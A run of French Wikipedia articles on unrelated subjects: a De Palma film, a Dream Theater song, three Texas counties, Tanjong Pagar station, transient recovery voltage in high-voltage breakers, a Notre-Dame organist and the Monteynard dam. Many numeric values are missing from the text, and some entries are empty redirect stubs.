La musique du film est composée par Pino Donaggio, qui avait déjà collaboré avec Brian De Palma en 1976 pour "Carrie au bal du diable", en 1980 pour "Home Movies" et "Pulsions", en 1981 pour "Blow Out", en 1984 pour "Body Double" et collaborera à nouveau avec lui pour "Passion" (2012) et "Domino" (2019). On peut également entendre dans le film la musique "Morning Mood", composée par Edvard Grieg comme accompagnement musical de la pièce de théâtre "Peer Gynt".
Accueil.
Critique.
Le film récolte des critiques mitigées. Sur l'agrégateur américain Rotten Tomatoes, le film n'obtient que 52% d'opinions favorables, pour 21 critiques presse recensées.
Sortie vidéo.
Le film sort en DVD et combo DVD/Blu-ray le 7 juillet 2020, édité par Elephant Films.
"Director's cut ".
Le réalisateur néerlandais Peet Gelderblom, fan de Brian De Palma, remonte le film d'après le scénario initial prévu en inversant certaines séquences. Le film de De Palma se présentait dans l'ordre chronologique alors qu'initialement il devait mêler présent, passé et « fantasmes ». Brian De Palma avait plus tard fait part de ses regrets à propos de cette décision, qui avait été prise tardivement en postproduction. Peet Gelderblom remonte donc le film d'après le script initial et publie le résultat sur Internet en 2012. Brian De Palma découvre par la suite cette version et l'apprécie. Il accepte qu'elle soit nommée "director's cut". Cette version est ensuite éditée en vidéo, notamment par Elephant Films en France en .

</doc>
<doc id="1873584" url="https://fr.wikipedia.org/wiki?curid=1873584" title="L'esprit de caïn">
L'esprit de caïn



</doc>
<doc id="1873585" url="https://fr.wikipedia.org/wiki?curid=1873585" title="L'esprit de cain">
L'esprit de cain



</doc>
<doc id="1873586" url="https://fr.wikipedia.org/wiki?curid=1873586" title="Raising Cain">
Raising Cain



</doc>
<doc id="1873587" url="https://fr.wikipedia.org/wiki?curid=1873587" title="Repentance (chanson)">
Repentance (chanson)

Repentance est la cinquième chanson de l'album "Systematic Chaos" du groupe Dream Theater.
La chanson fut écrite par Mike Portnoy et fait partie de sa Alcoholics Anonymous suite qui traite des douze étapes du programme des Alcooliques anonymes. La suite a commencé sur le sixième album du groupe "Six Degrees of Inner Turbulence". "Repentance" inclus les étapes huit et neuf du programme des alcooliques anonymes. Par rapport aux chansons précédentes de la suite, "Repentance" est plus calme et lente.
L'introduction de la chanson consiste en une reprise la mélodie entendue dans le mouvement IV de la Alcoholics Anonymous suite, Reflections of Reality (Revisited), de la chanson "This Dying Soul" qui est sur l'album "Train of Thought". Les premières paroles, "« Hello, mirror / So glad to see you my friend / It's been a while »" sont les mêmes que les paroles qui ouvrent la chanson This Dying Soul. Toutefois, tel que vu dans le documentaire "Chaos In Progress: The Making of Systematic Chaos documentary", cette partie est chantée par Mike Portnoy plutôt que par James LaBrie. Les voix ont également été mixées de façon à donner l'impression qu'elles sortent d'un téléphone.
La fin de la chanson contient un long passage parlé connu comme les « douze promesses » des pages 83–84 du livre des Alcooliques anonymes.
Selon Chaos in Progress, le titre préliminaire de la chanson était "Song #7" ou "Fisheye".
Crédits.
Parties parlées.
La section du milieu de la chanson inclut des excuses dites par les personnes suivantes :
La toute fin de la chanson comprend également deux dialogues finaux :

</doc>
<doc id="1873589" url="https://fr.wikipedia.org/wiki?curid=1873589" title="Comté de Parker">
Comté de Parker

Le comté de Parker, en "", est un comté situé au nord de la partie centrale de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Weatherford. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé en référence à Isaac Parker, personnalité politique de la république du Texas.
Organisation du comté.
Le comté est fondé le , à partir des terres des comtés de Bosque et de Denton. Il est définitivement organisé et autonome, le .
Le comté est baptisé en référence à Isaac Parker, sénateur du Texas ayant participé à la révolution texane.
Géographie.
Le comté de Parker se situe dans la partie nord du centre de l'État du Texas, aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873591" url="https://fr.wikipedia.org/wiki?curid=1873591" title="Gare de Tanjong Pagar">
Gare de Tanjong Pagar

La gare ferroviaire de Tanjong Pagar (Anglais : "Tanjong Pagar railway station", Mandarin : "丹戎巴葛火车总站", Malais : "Stesen Keretapi Tanjung Pagar"), également connue sous le nom de "Gare ferroviaire de Singapour" ou "Gare de Keppel Road", est un terminus ferroviaire que possède Keretapi Tanah Melayu (KTM), la principale compagnie ferroviaire de Malaisie. Les terrains situés à Singapour sur lesquels se trouvent les voies et la gare appartiennent à KTM pour un bail de 999 ans.
Situation ferroviaire.
S'agissait originellement d'une voie unique de 23km traversant l'ile de Singapour .D'un écartement de 1067mm (comme la Malaisie voisine dont Singapour appartenait avant son indépendance) elle se scindait en 3 voies arrivée a la gare de Tanjong Pagar.
De nos jour la voie à été déferrée entre la gare de singapour Tanjong Pagar (les voies subsistent dans l'enceinte de la gare) et celle de Woodlands ,et transformée en Rail corridor, un sentier pédestre.
La Gare de Woodlands est désormais la gare ferroviaire terminale de Singapour desservie par le KTM Shuttle Tebrau emmenant jusqu'a Kota Bharu via la gare de Gemas.Un rôle probablement amoindri à l'avenir par l'ouverture du RTS Link reliant la grande gare de Johor Bahru en Malaisie et la ligne de metro Thomson East coast Line a Woodlands North, permettant une meilleure connexion au réseau singapourien.
Histoire.
Avant la construction du "Johor-Singapore Causeway", le réseau ferré de Singapour n'était pas relié au continent. La construction du pont franchissant le détroit de Johor commença en 1919 ; la circulation des trains de marchandises put commencer le , et ceux de voyageurs, le octobre suivant. Auparavant, les marchandises comme les passagers étaient débarquées à Woodlands (au nord-nord-ouest de Singapour) pour prendre un ferry qui les amenait à Johor Bahru où ils pouvaient reprendre un train.
La gare de Tanjong Pagar fut terminée en 1932. Elle est désormais fermée depuis le juillet 2011.
Sur l'extérieur de la gare, nous voyons les lettres "FMSR", désignant les "Federated Malay States Railways" (Chemins de fer des États malais fédérés), ancien opérateur de la gare. Elle est construite dans le style Art déco. L'extérieur de la gare offre quatre sculptures en marbre ; des allégories des quatre principaux secteurs de l'économie malaise : l'agriculture, le commerce, les transports et l'industrie.

</doc>
<doc id="1873592" url="https://fr.wikipedia.org/wiki?curid=1873592" title="Comté de Parmer">
Comté de Parmer

Le comté de Parmer, en "", est un comté situé dans le Panhandle, au nord de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Farwell. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est nommé en référence à Martin Parmer, un pionnier et un vétéran de la révolution texane.
Organisation du comté.
Le comté est fondé le , à partir de terres du comté de Young. Après plusieurs aménagements fonciers, il est définitivement organisé et autonome, le . 
Le comté est baptisé en référence à , un pionnier, juge, signataire de la déclaration d'indépendance du Texas, ayant participé à la révolution texane.
Géographie.
Le comté de Parmer se situe au sud-est du Texas Panhandle, sur les hautes plaines de la Llano Estacado, au nord de l'État du Texas, aux États-Unis. Il est bordé à l'ouest par le Nouveau-Mexique. À cette frontière passe le fuseau horaire de l'heure des Rocheuses.
Il a une superficie totale de , composée de de terres et de de zones aquatiques. Le comté est drainé par le , un ruisseau intermittent mais sujet aux débordements.
L'altitude varie de à .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873593" url="https://fr.wikipedia.org/wiki?curid=1873593" title="Comté de Pecos">
Comté de Pecos

Le comté de Pecos, en "", est un comté situé à l'ouest de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Fort Stockton. Selon le recensement de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est nommé d'après la rivière Pecos.
Organisation du comté.
Le comté de Pecos est créé le , à partir de terres du comté de Presidio. Le , il est définitivement organisé et autonome. 
Le comté est nommé en référence à la rivière Pecos qui s'écoule au nord de la frontière du comté. Le nom désigne les "", en , les Amérindiens du Nouveau-Mexique qui ont été formés à l'élevage par les Espagnols.
Géographie.
Le comté de Pecos est situé à l'ouest du Texas, aux États-Unis. Son altitude est comprise entre et . L'Est et le Centre du comté sont situés sur le plateau d'Edwards.
Il a une superficie totale de , composée de de terres et de de zones aquatiques, ce qui en fait le deuxième plus vaste comté du Texas.
La rivière Pecos est la seule grande source d'eau de surface du comté. Elle coule en continu, tandis que les autres cours d'eau du comté ne coulent qu'après des pluies torrentielles, peu fréquentes.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .
Selon l"'American Community Survey", en 2010, 53,98 % de la population âgée de plus de déclare parler l'espagnol à la maison, 45,14 % déclare parler l'anglais, 0,51 % l'hindi et 0,37 % une autre langue.

</doc>
<doc id="1873594" url="https://fr.wikipedia.org/wiki?curid=1873594" title="Tension transitoire de rétablissement">
Tension transitoire de rétablissement

La tension transitoire de rétablissement ("TTR", ou "TRV" de l'anglais "Transient Recovery Voltage") est la tension électrique qui se rétablit aux bornes d'un appareillage électrique lorsqu'il interrompt un courant alternatif.
C'est un paramètre qui influe fortement sur la réussite d'une coupure de courant dans un réseau à haute tension. Lors du développement d'un disjoncteur ou d'un interrupteur à haute tension, le constructeur doit démontrer que l'appareil supporte les TTR définies par les normes CEI ou IEEE. Pour leur part, les utilisateurs de ce matériel doivent définir les valeurs requises dans leurs spécifications.
Cette notion de TTR existe aussi en basse tension. Elle est explicitement définie pour caractériser les conditions d'essais et indique une fréquence de TTR maximale dans les stations d'essai dans deux cas : dans la norme CEI 60947-4 pour les contacteurs et dans la norme CEI 60898-1 pour les disjoncteurs à usage domestique. Dans les deux cas, ces normes recommandent de mettre une résistance en dérivation de l'inductance lorsque celle-ci est constituée d'une bobine dans l'air. Par contre, avec les inductances à fer (avec carcasse ferromagnétique), la TTR est amortie par les pertes (hystéresis et autres) et une résistance en dérivation devient inutile.
Généralités.
Historique.
L'importance de la TTR lors de la coupure d'un courant a été mise en évidence pendant les années 1950, elle a été introduite dans la norme des disjoncteurs CEI 56 (seconde édition) en 1954. Son influence sur la coupure des disjoncteurs à haute-tension commençait à être reconnue, par suite les valeurs en essai devaient être notées dans les rapports mais il était encore trop tôt pour spécifier des caractéristiques dans les normes.
Le terme de TTR et des valeurs normalisées des paramètres ont été introduits dans la norme CEI 56 en 1971, à la suite d'études effectuées par le CIGRE.
Caractéristiques.
La TTR se décrit suivant deux paramètres principaux : l'amplitude maximale de la tension ("AF" pour amplitude factor), et sa vitesse de montée ("RRRV" pour Rate of Rise of Recovery Voltage).
L'amplitude maximale peut être exprimée comme le ratio entre la valeur maximale de la surtension et la tension nominale du réseau (en PU pour « Par Unité »). Une amplitude trop importante peut entraîner la reformation d'un arc électrique après la coupure du courant dans un réseau.
La vitesse de montée, qui s'exprime en kV/µs, est un facteur qui va déterminer si un arc électrique va se reformer et s'entretenir aux bornes de l'appareillage de coupure, dans le cas où ce dernier n'est pas adapté pour l'application.
Facteurs d'influence.
Les paramètres de la TTR (amplitude, pente) dépendent des caractéristiques du réseau électrique où la coupure s'effectue et du type de défaut (monophasé, biphasé, triphasé, à la terre ou isolé). Ils sont définis par les normes internationales CEI et IEEE.
En première approximation (si les réflexions d'ondes de tension ne sont pas prises en compte), un réseau électrique peut être schématisé par un circuit RLC et les variations temporelles possibles de la TTR sont montrées par la figure 1.
La TTR est influencée en particulier par :
La TTR la plus sévère est appliquée au premier pôle du disjoncteur ou de l'interrupteur qui interrompt un défaut, dans un système triphasé isolé de la terre.
Une TTR se rétablit aux bornes d'un appareil lorsqu'il interrompt un courant de défaut (défaut aux bornes, défaut en ligne, discordance de phases) mais aussi dans des conditions normales de service (ouverture de lignes, déconnexion d'une réactance, d'un transformateur ou d'un moteur).
La coupure est généralement réalisée lors d'un passage par zéro naturel du courant alternatif, ou plus rarement lorsque l'appareil force le passage par zéro du courant (voir Coupure de charges inductives).
Pour réussir la coupure, la tension de tenue entre les contacts d'un disjoncteur ou d'un interrupteur après l'interruption du courant doit être supérieure à la TTR de façon à éviter un claquage diélectrique et un rétablissement du courant. Avec les techniques de coupure actuelles, il n'est généralement pas nécessaire de modifier la TTR pour obtenir la coupure de courants, y compris avec des valeurs très élevées de ou . Pour la coupure de défauts en lignes de forte intensité il peut être utile cependant de réduire la pente de la TTR à l'aide de condensateurs montés en parallèle à l'appareil ou entre le disjoncteur et la ligne aérienne. Pour faciliter la coupure de faibles courants inductifs des circuits RC ou des varistances sont parfois utilisés pour respectivement réduire la pente ou l'amplitude de la TTR.
Circuit capacitif.
Dans le cas d'une coupure de courant dans un circuit monophasé capacitif, la tension rétablie maximale atteint 2 p.u. (1 p.u. étant la valeur crête de la tension de la source), une demi-période après l'instant de coupure du courant (figure 2).
La coupure du courant par un interrupteur s'effectue normalement à un passage par zéro du courant. À cet instant la tension aux bornes de la capacité de charge est maximale, du fait du déphasage courant-tension.
Lorsque la capacité est isolée du circuit d'alimentation, par la coupure de l'interrupteur, la capacité conserve la charge qu'elle possédait à l'instant de coupure. Par suite la tension en aval de l'interrupteur reste constante (si les pertes sont négligeables). Dans le même temps, la tension en amont de l'interrupteur est égale à la tension de la source et oscille à fréquence industrielle. La tension rétablie aux bornes de l'interrupteur, qui est la différence entre les tensions en amont et en aval, atteint par suite une valeur maximale de 2 p.u., comme on peut le voir sur la figure 2.
Ces types de TTR sont rencontrés en pratique lors de la coupure de courants de lignes à vide (ouvertes à l'autre extrémité), câbles à vide et de batteries de condensateurs.
La figure 3 montre que dans le cas d'une coupure de charge triphasée la tension aux bornes du premier pôle qui coupe est plus élevée. Ceci est dû au fait que la tension du point neutre de la charge augmente de 0,5 p.u. (1 p.u. = formula_1, U étant la tension entre phases côté source) après la coupure du premier pôle. La valeur crête de la TTR dans le cas d'une batterie de condensateurs à neutre isolé est égale à 2,5 p.u.
D'une manière générale, lorsque le circuit de charge a des capacités entre phases et par rapport à la terre, la tension maximale aux bornes du premier pôle qui coupe (le plus contraint) est fonction du rapport entre les capacités directe et homopolaire du circuit de charge. Dans le cas de lignes à haute tension, la valeur maximale de la TTR définie par les normes CEI et IEEE pour la coupure triphasée par des disjoncteurs à haute tension est égale à 2,4 p.u, soit 20 % de plus par rapport à une coupure monophasée.
La figure 4 montre l'évolution des tensions lorsqu'un disjoncteur (ou un interrupteur) réamorce une demi-période après l'instant de coupure. La tension du côté source rejoint instantanément la tension de la charge (-1 p.u. à cet instant), puis tend à rejoindre la tension de la source qui vaut +1 p.u. au même instant, soit une différence de 2 p.u. L'amortissement étant habituellement négligeable, la tension sur les deux bornes de l'appareil oscille autour de la valeur +1 p.u. et atteint par suite 1 + 2 = 3 p.u. Le réamorçage provoque dans ce cas une surtension élevée sur le circuit.
À noter que la figure 4 illustre le cas le plus défavorable où le réamorçage conduit à la surtension maximale, un réamorçage effectué un quart de période après l'instant de coupure aurait conduit à une tension maximale de 1 p.u., il n'y aurait pas eu de surtension. Par suite les claquages qui se produisent entre 0 et 1/4 de période après l'instant de coupure sont appelés "réallumages". Les réallumages sont autorisés car ils ne provoquent pas de surtensions.
Le réamorçage d'un pôle d'appareil en coupure triphasée d'une charge avec neutre isolé donne lieu à des surtensions plus élevées qu'en monophasé, du fait de la variation importante de la tension du point neutre de la charge provoquée par le réamorçage, il conduit généralement au réamorçage d'au moins un des autres pôles.
Un interrupteur ou disjoncteur doit être capable de supporter cette tension rétablie lors de l'ouverture du circuit, par suite il doit séparer ses contacts avec une vitesse suffisante pour assurer que la tension de tenue entre contacts est toujours supérieure ou égale à la tension rétablie imposée par le circuit/réseau. Une vitesse insuffisante conduirait à un réamorçage de l'appareil et à une surtension susceptible d'endommager les composants connectés au circuit ou au réseau.
La figure 5 montre que la tension se rétablit plus rapidement dans un réseau à , par rapport à un réseau à , une vitesse de déclenchement plus élevée est donc nécessaire pour assurer la coupure sans réamorçage dans un réseau à .
Circuit inductif.
La coupure dans un circuit inductif est rencontrée en pratique dans deux cas principaux :
Les normes CEI et IEEE distinguent deux cas principaux de coupure de court-circuit dans un réseau électrique à haute tension : le défaut aux bornes et le défaut en ligne (figure 6). L'établissement et la coupure de courants dans deux réseaux en discordance de phases peut aussi s'effectuer avec des courants de défaut de forte intensité.
La coupure du défaut en ligne n'est applicable qu'aux disjoncteurs reliés directement à des lignes aériennes.
Coupure de défaut aux bornes.
La coupure d'un défaut aux bornes est faite normalement à un passage par zéro du courant et, par suite, à un instant où la tension du réseau est maximale. La tension en amont du disjoncteur, qui est nulle avant interruption du courant de défaut, tend à rejoindre la tension du réseau avec un régime transitoire dont la fréquence vaut plusieurs kilohertz (figure 7).
On obtient ce type de TTR dans le cas de coupures de courants de court-circuit par un disjoncteur, en particulier avec le courant de défaut d'intensité maximale qui n'est limité que par l'impédance de court-circuit du réseau (figure 8a).
Par analogie des oscillateurs en électricité et en mécanique, le régime transitoire de la TTR dans le réseau représenté par la figure 7a est similaire à celui d'un système mécanique (figure 8b) constitué par une masse actionnée par un ressort avec des pertes par frottement correspondant à la résistance (non représentée) du circuit électrique.
La tension en amont du disjoncteur (TTR) varie comme la charge de la capacitance (C), son évolution est analogue au déplacement de la masse dans le système mécanique. C'est par exemple une oscillation amortie comme illustré par la figure 7b qui montre le déplacement d'une masse sous l'action d'un ressort qui a été comprimé au préalable.
La fréquence d'oscillation de la TTR est donnée par la formule suivante :
L'amplitude de la TTR dépend de l'amortissement dû aux pertes dans les composants du circuit et par l'impédance caractéristique des lignes et câbles connectés en amont de l'interrupteur. Le facteur d'amplitude est le rapport entre l'amplitude maximale de la TTR et la valeur instantanée de la tension source à l'instant de coupure.
La norme CEI 62271-100 pour les disjoncteurs à haute tension spécifie un facteur d'amplitude égal à 1,4 pour un défaut aux bornes avec le courant de défaut maximal.
Dans les réseaux de distribution, la TTR oscille avec une seule fréquence qui dépend de l'inductance de court-circuit et de la capacité en amont de l'interrupteur (figure 7a).
Dans les réseaux de transport, la TTR oscille généralement avec une double fréquence, avec une première montée de tension qui dépend de l'inductance de court-circuit et de la capacité locale du réseau, suivie d'une deuxième oscillation due aux réflexions d'onde de tension sur les lignes connectées en amont de l'appareil (figure 5).
Comme indiqué sur la figure 9, les normes internationales spécifient une enveloppe caractéristique de tenue à la tension transitoire de rétablissement qui couvre la grande majorité des applications.
La TTR spécifiée dans ce cas est dite à "quatre paramètres" car quatre valeurs (deux tensions et deux temps) sont nécessaires pour tracer l'enveloppe.
Lors des essais de type d'un disjoncteur, l'enveloppe de la TTR en essai doit être au-dessus de l'enveloppe spécifiée par la norme (CEI ou IEEE) afin d'assurer que la tenue de l'appareil est supérieure à celle de la TTR imposée par le réseau.
Par rapport à ce qui est obtenu lors d'une coupure de défaut monophasé, la valeur crête de la TTR est 30 % ou 50 % plus élevée lors d'une coupure de défaut aux bornes triphasé.
La valeur crête de tension est maximale aux bornes du premier pôle qui coupe, sa valeur dépend des conditions de mise à la terre du réseau.
Le rapport des tensions rétablies maximales obtenues en coupure de défaut triphasé et de défaut monophasé est appelé "facteur de premier pôle" dans les normes de disjoncteurs à haute tension. La valeur du facteur de premier pôle est fonction des composantes symétriques des impédances du réseau et du type de défaut (isolé ou à la terre).
Le facteur de premier pôle spécifié par la norme CEI 62271-100 est égal à 1,3 pour les réseaux à neutre effectivement à la terre, il est égal à 1,5 pour les réseaux à neutre non-effectivement à la terre et pour les défauts triphasés isolés par rapport à la terre.
La norme CEI considère que pour des tensions nominales supérieures à , le neutre des réseaux est effectivement à la terre, de sorte que le facteur de premier pôle est égal à 1,3. En d'autres termes, la valeur crête de la TTR est augmentée de 30 % pour le premier pôle qui coupe un défaut triphasé, par rapport à la valeur obtenue lors d'une coupure d'un défaut monophasé.
Coupure de courant de défaut limité par un transformateur.
Parmi les défauts aux bornes, on distingue ceux dont le courant est limité essentiellement par l'impédance d'un transformateur et qui se produisent dans les cas particuliers où il n'y a pas de composants capacitifs (ligne, câble ou condensateur) entre le transformateur et le disjoncteur.
Le disjoncteur et le point de défaut sont situés du même côté du transformateur "défaut limité par le transformateur" (figure 9a) ou de part et d'autre du transformateur "défaut au secondaire du transformateur" (figure 9b).
La TTR associée à ces défauts est caractérisée par une vitesse de rétablissement (ou pente) élevée.
La fréquence d'oscillation de la TTR est la fréquence propre du transformateur, réduite en partie par la capacité de la liaison entre le transformateur et le disjoncteur (ou interrupteur).
Les normes internationales prennent en compte ces défauts au secondaire d'un transformateur (ou limités par un transformateur) en spécifiant des valeurs adaptées de TTR pour les essais de type effectués avec 10 % et 30 % du pouvoir de coupure des disjoncteurs.
Pour des tensions assignées inférieures à , la norme CEI préconise des TTR particulières pour un courant de défaut égal à 30 % du pouvoir de coupure lorsque la capacité de la liaison entre le disjoncteur et le transformateur est négligeable.
Pour des tensions assignées supérieures à , le cas particulier où la capacité de la liaison est négligeable est à l'étude par CIGRÉ. Le guide IEEE C37.011 (2011) préconise plusieurs méthodes pour déterminer la vitesse de rétablissement de tension et la comparer avec des résultats d'essais.
Coupure de défaut proche en ligne.
Les figures 6 et 11 illustrent le cas particulier d'un défaut proche en ligne, c'est-à-dire d'un défaut qui se produit sur une ligne à quelques centaines de mètres ou quelques kilomètres en aval du disjoncteur, d'où le nom de "défaut kilométrique" qui est parfois donné à ce type de défaut.
La TTR est caractérisée par une oscillation initiale à haute fréquence, due aux réflexions d'onde entre le disjoncteur et le point de défaut, qui impose une vitesse de rétablissement élevée de la tension après la coupure du courant de défaut (origine des temps sur la figure 11).
La figure 12 donne l'évolution de la tension le long de la ligne après l'interruption du courant. La durée TL est égale au temps mis par une onde pour effectuer le trajet aller et retour entre le disjoncteur et l'extrémité de la ligne. La tension en chaque point est à chaque instant la somme des ondes incidentes et des ondes réfléchies aux deux extrémités de la ligne. L'évolution de la tension en chaque point de la ligne est montrée pendant une demi-période de l'oscillation, elle évolue d'une manière similaire pendant la demi-période suivante, mais avec une polarité opposée.
L'évolution temporelle de la tension sur la borne aval du disjoncteur, qui peut être déduite à partir de la figure 12, est représentée par la figure 13. Cette tension a une forme triangulaire qui est caractéristique d'un défaut en ligne, les oscillations sont en réalité amorties par les pertes résistives. La tension en amont du disjoncteur variant peu pendant les premières micro-secondes du rétablissement de tension, la TTR (différence entre les tensions en amont et aval) a par suite l'évolution indiquée sur la figure 11.
L'amplitude de la première crête de tension vaut quelques dizaines de kilovolts et le temps TL est de l'ordre de quelques micro-secondes.
Le défaut en ligne est caractérisé par le fait que la pente de la TTR est proportionnelle à la pente du courant avant l'instant de coupure (en valeur absolue) et donc à l'intensité du courant :
La valeur normalisée de "Z" est égale à . On rappelle que "Z" est égal à formula_4, où "l" et "c" sont les inductance et capacité de la ligne par unité de longueur.
Comme on peut le voir sur la figure 14, le courant d'un défaut proche en ligne (IL) est plus faible que le courant d'un défaut qui se produit aux bornes d'un disjoncteur (IS). Dans les normes, le courant de défaut proche en ligne est exprimé en pourcentage du courant de défaut aux bornes.
Lorsque la longueur de ligne en défaut est courte (XL faible), le courant de défaut est élevé et la tension rétablie côté ligne est faible. À l'inverse, lorsque le défaut se produit loin du disjoncteur (XL élevé), le courant est faible et la tension rétablie côté ligne est élevée.
Les contraintes les plus sévères pour un disjoncteur sont obtenues lorsque le défaut se produit à un ou plusieurs kilomètres de l'appareil, ce qui correspond à un courant de défaut en ligne égal à environ 90 % du courant de défaut aux bornes du disjoncteur. La distance entre le disjoncteur et le point de défaut étant relativement courte, on parle alors de défaut proche en ligne.
Dans le cas d'un courant de défaut de à , la pente de la TTR est égale à /µs, soit 3,6 fois supérieure à celle qui est spécifiée pour un défaut aux bornes avec 100 % du courant de défaut. La TTR générée par la coupure défaut en ligne est donc plus contraignante pour un disjoncteur pendant la phase initiale du rétablissement de tension. Par contre la valeur crête d'une TTR de défaut aux bornes triphasé est plus élevée et donc plus contraignante pendant la phase dite "diélectrique" de la coupure, quelques centaines de micro-secondes après l'instant de coupure. Les deux conditions de coupure de défaut aux bornes et de défaut en ligne, qui présentent des contraintes différentes, sont testées lors d'essais de type pour la qualification d'un disjoncteur.
La valeur élevée de la pente initiale de la TTR lors d'une coupure d'un défaut proche en ligne fait que ce type de coupure est difficile à supporter par un disjoncteur à haute tension et que ce dernier doit parfois être muni de condensateurs pour diminuer la pente de la TTR et faciliter ainsi la coupure du courant de défaut.
Coupure de charges inductives.
Dans le cas particulier de coupure d'une charge inductive, la TTR est notablement différente car un interrupteur n'attend pas généralement le passage par zéro du courant pour effectuer l'ouverture du circuit. La puissance d'extinction de l'interrupteur est souvent telle que le courant est interrompu alors qu'il vaut plusieurs ampères ou dizaines d'ampères dans la charge (représentée par une inductance dans le schéma monophasé équivalent de la figure 15). Ce phénomène est appelé "arrachement de courant" ou "hachage de courant".
Le circuit LC qui oscille avec une pulsation :
où formula_6 est la valeur équivalente des capacités parasites. Si l'isolation électrique et la rigidité électrique du bobinage sont suffisantes pour résister aux hautes tensions et si la tension de tenue de l'interrupteur est suffisante, l'oscillation continuera avec une amplitude décroissante à cause des pertes diélectriques des capacités parasites et de pertes résistives du bobinage. Si, de plus, la bobine comporte un noyau ferromagnétique il y aura aussi des pertes dues à l'hystérésis.
La tension maximale de l'oscillation peut être très élevée, comme illustré sur la figure 17 qui montre le cas extrême où le courant est interrompu alors qu'il a son amplitude maximale. Ceci lui vaut le nom de surtension. Ceci vient du fait qu'après l'interruption du courant l'énergie de l'inductance &lt;math&gt;\scriptstyle

</doc>
<doc id="1873595" url="https://fr.wikipedia.org/wiki?curid=1873595" title="Hyrokkin (lune)">
Hyrokkin (lune)



</doc>
<doc id="1873598" url="https://fr.wikipedia.org/wiki?curid=1873598" title="Antoine Desprez">
Antoine Desprez

Antoine Desprez (17?? - ) fut organiste de la Cathédrale Notre-Dame de Paris 1802 à 1806.
Il contribua à la préservation de cet orgue par une intervention en 1794 à la Commission temporaire des Arts à une époque où la cathédrale était transformée en Temple de la Raison en demandant à en jouer par cette déclaration : «le mélange des jeux produit différents effets plus beaux les uns que les autres et forme un orchestre qui peut très bien servir à accompagner nos chants civiques, peindre les sentiments des vrais républicains, peindre aussi les foudres que nous réservons aux tyrans ».
Article connexe.
Grand orgue de la cathédrale Notre-Dame de Paris

</doc>
<doc id="1873599" url="https://fr.wikipedia.org/wiki?curid=1873599" title="Lac de Monteynard">
Lac de Monteynard



</doc>
<doc id="1873600" url="https://fr.wikipedia.org/wiki?curid=1873600" title="Petit train de La Mure">
Petit train de La Mure



</doc>
<doc id="1873601" url="https://fr.wikipedia.org/wiki?curid=1873601" title="Barrage de Monteynard-Avignonet">
Barrage de Monteynard-Avignonet

Le barrage de Monteynard-Avignonet ou barrage de Monteynard est un barrage-voûte sur le Drac, situé sur les communes de Monteynard et Avignonet dans le département de l'Isère en France. Mis en service en 1962, il est l'un des plus importants barrages hydroélectriques français, avec une puissance installée de .
Géographie.
Le barrage de Monteynard-Avignonet est situé dans l'Isère.
Selon la légende, le nom du Drac proviendrait d’un dragon du folklore Dauphinois, « justifiant très bien son appellation, lorsque l’on découvre son caractère agité ». Ainsi on peut dire que l’hydraulicien maitrise aujourd’hui l’énergie du dragon qui est à l’origine d’une puissance cumulée sur l’ensemble de la vallée (Le Sautet, Cordéac, Saint-Pierre-Cognet, Monteynard, Saint-Georges-de-Commiers, et Champs II) de , soit l’équivalent de la consommation d’une ville comme Lyon.
Histoire.
Dès le début du , quelques centrales turbinent l’eau du Drac et de ses affluents. Il faudra cependant attendre 1930 avant que le parcours de ce torrent des Alpes ne soit considéré sous un angle industriel nouveau, les gorges profondes qu’il traverse offrant un site favorable à l’implantation en cascade de barrages et de leurs aménagements hydroélectriques.
Sa construction a nécessité l'arasement du village de Savel et du hameau de la Salette (commune de Treffort) appelés à être noyés.
Le barrage de Monteynard-Avignonet est mis en service en 1962.
Aménagement du Drac en aval du barrage.
Vers l’amont, l’équipement du Drac commencé avec la construction du barrage du Sautet (1935) est suivi des réalisations successives des chutes de Cordéac (1946) et de Saint-Pierre-Cognet (1957). Fortement équipé pour pouvoir mettre à tout instant sur le réseau « très haute tension » (THT) une puissance de pointe de , Monteynard-Avignonet est complété à l’aval par l’aménagement de Saint-Georges-de-Commiers (1962) (barrage de Notre-Dame-de-Commiers et les centrales de Saint-Georges-de-Commiers et Champ II). Le Drac est ensuite équipé d’aménagements au fil de l’eau jusqu’à sa confluence avec l’Isère : la centrale de Pont-de-Claix associée au barrage du Saut du Moine, les centrales de Drac Inférieur et de Saint-Égrève.
Mise en eau du barrage.
Les travaux d’infrastructure ont été importants, car le fond de la gorge étroite et profonde était difficilement accessible et contenait des rochers instables. La configuration particulière du site nécessita la construction d’une voûte épaisse de de béton pour permettre de loger l’usine au pied du barrage. Deux évacuateurs de crue sont incorporés à l’ouvrage. Quatre prises d’eau sont disposées sur le parement amont et alimentent à travers quatre conduites forcées verticales noyées dans le béton, les quatre groupes de production sous une chute de .
La centrale est mise en service en avril 1962 et la première mise en eau totale est réalisée en avril 1963. À sa construction, Monteynard-Avignonet était le deuxième plus grand barrage artificiel de France, après celui de Serre-Ponçon.
Caractéristiques techniques du barrage.
Le barrage de Monteynard-Avignonet, situé à d’altitude, à au sud de Grenoble, est de type voûte épaisse en béton ( d’épaisseur en crête et d’épaisseur à la base), haut de et long de . Il constitue sur de longueur un lac d’une superficie de .
Évacuateurs de crues.
Deux évacuateurs de surface équipés chacun d'une vanne segment H = x L = , situés au milieu du barrage, avec seuil à la cote .Capacité théorique : /s à la cote .
Vidange du barrage.
Deux vannes de vidange de demi-fond, équipées chacune d'une vanne de garde type chenille de H = x L = , seuil à la cote et d'une vanne secteur de réglage x , seuil à la cote . 
Centrale électrique.
La centrale incorporée dans le corps du barrage a été mise en service en 1962. Elle est télécommandée depuis le Centre de Conduite Hydraulique (CCH) de Lyon. L’usine, de type moyenne chute, est équipée de quatre groupes verticaux à turbines Francis. Sa puissance totale est de et sa production moyenne annuelle est de soit la consommation résidentielle d’une ville de . Cette production à partir d’une énergie 100 % renouvelable, permet d’éviter l’émission de de par an.
Caractéristiques.
La centrale hydroélectriques se caractérise par :
Risques naturels.
